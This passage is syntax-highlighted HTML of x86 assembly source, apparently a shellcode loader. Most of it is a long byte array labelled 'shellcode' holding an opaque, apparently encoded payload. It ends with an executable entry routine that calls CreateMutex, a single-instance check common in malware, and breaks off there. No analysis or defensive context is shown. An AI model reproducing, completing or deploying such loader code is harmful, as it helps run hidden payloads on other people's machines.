    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x6B</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xAC</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x48</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xA6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4B</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x6B</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x14</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xF7</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x78</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x19</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x67</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x95</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x09</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x11</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xA7</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x97</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7D</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x37</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xA7</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xE5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x46</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x38</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xBB</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x9D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xA3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x55</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xA4</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0xF9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xE5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xB9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x11</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x3A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEB</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x19</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x9C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xCA</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x59</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x79</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x09</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x56</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x78</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xE6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x19</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x45</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD2</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x4B</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xBB</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x96</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xE9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x26</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x14</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xAE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xDA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x47</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x73</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x43</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x8C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x71</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x8C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x9B</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x8F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x6D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x21</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x95</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x19</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xA6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x6E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x53</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xB8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xA6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x46</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x47</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x24</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x95</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x21</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xA6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x86</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xF7</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x9C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC8</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x4D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xF5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x9B</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x63</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xA3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xF5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xBF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD1</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x33</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x39</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD6</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x89</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xB2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x88</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x09</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x69</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x67</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x45</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC2</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0xD0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xAF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x75</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x5F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xE0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFC</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x73</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x74</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7C</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0xB3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xDD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x47</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xF7</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xDA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xF6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x53</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2D</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x1E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x46</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x41</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x27</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x84</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xF8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD1</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x25</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x21</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x02</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x57</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xA8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x6C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEB</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x67</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xA3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEC</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x87</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x7E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xF9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x35</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xF9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x11</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x43</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4B</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xB7</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x86</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x47</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x1B</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xB8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xE2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x87</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x45</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xCF</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0xE9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xCE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xF9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x79</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x74</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x78</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0xC6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x74</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x78</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0xCA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xDC</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x52</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x14</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x45</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x37</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x3C</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x97</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xAD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x74</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x49</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x74</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2C</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x76</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x5E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xA7</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x78</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x5E</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x7D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x61</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x5D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x6D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x48</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x17</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x9C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x68</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0xEE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x3D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x78</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x46</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x58</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x36</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xB0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x88</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x61</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x97</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xA8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2D</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x76</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x17</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x46</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4B</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x87</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xED</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x60</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x44</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x42</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7B</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xE1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xF1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC6</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0xFB</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x19</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x78</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xF2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x78</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xCE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1B</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x98</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x51</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x3A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x5B</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x42</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xDE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x25</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x51</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x74</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x97</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x52</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xDE</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0xB4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFC</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xB2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x58</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xEE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xB0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xF1</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0xE1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xF9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xD2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4B</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xA3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x7F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xE1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xF5</span><span class="sc0">

</span><span class="sc5">shellcode_LEN</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">shellcode</span><span class="sc4">)</span><span class="sc0">





</span><span class="sc9">section</span><span class="sc0"> </span><span class="sc10">.text</span><span class="sc0"> </span><span class="sc5">execute</span><span class="sc0">
</span><span class="sc9">GLOBAL</span><span class="sc0"> </span><span class="sc5">_entry</span><span class="sc0">


</span><span class="sc5">_entry</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">szMutexName</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateMutex</span><span class="sc0">
